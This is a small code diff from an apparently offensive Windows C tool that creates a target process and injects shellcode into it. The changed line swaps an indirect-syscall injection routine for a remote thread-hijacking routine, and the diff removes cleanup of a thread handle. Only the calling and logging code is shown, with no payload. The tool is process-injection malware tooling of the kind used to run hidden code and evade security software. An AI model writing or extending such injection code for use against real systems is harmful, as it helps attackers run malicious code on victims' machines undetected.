@@ -51,7 +51,7 @@ int main()
 	OKAY("[0x%p] [%d] Process %s Created!", hProcess, dwProcessId, TARGET);
 
 	INFO("Performing Injection via Indirect Syscalls!");
-	if (!IndirectSyscallInjection(hProcess, Shellcode, sizeof(Shellcode), &pAddress))
+	if (!RemoteThreadHijack(hProcess, Shellcode, sizeof(Shellcode), &pAddress))
 	{
 		WARN("IndirectSyscallInjection Function Failed! With an Error: %d", GetLastError());
 		return -1;
@@ -78,12 +78,6 @@ int main()
 	{
 		INFO("[0x%p] Closing hProcess...", hProcess);
 		CloseHandle(hProcess);
-	}
-
-	if (hThread)
-	{
-		INFO("[0x%p] Closing hThread...", hThread);
-		CloseHandle(hThread);
 	}
 
 	CHAR("Quit...");
